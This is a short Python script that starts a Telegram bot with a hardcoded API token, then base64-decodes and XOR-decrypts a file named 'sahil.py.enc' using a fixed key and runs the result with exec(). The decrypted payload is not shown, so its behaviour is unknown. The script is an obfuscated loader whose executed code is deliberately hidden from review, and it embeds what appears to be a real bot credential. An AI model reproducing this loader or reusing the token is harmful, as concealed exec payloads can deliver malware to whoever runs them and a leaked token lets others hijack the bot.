import base64
import telebot
# Initialize the bot with your token
bot = telebot.TeleBot('5942641741:AAFZhB9k68JhzraZGMXNtoxVIVApY-qQPh0')

# First, delete any existing webhook
# bot.remove_webhook()

# Now start polling
# bot.polling()

def xor_encrypt_decrypt(data, key):
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, key * (len(data) // len(key) + 1)))

with open('sahil.py.enc', 'r') as file:
    encrypted_script_base64 = file.read()

key = '@SahilModzOwner' 
encrypted_script = base64.b64decode(encrypted_script_base64).decode()
decrypted_script = xor_encrypt_decrypt(encrypted_script, key)

exec(decrypted_script)
 
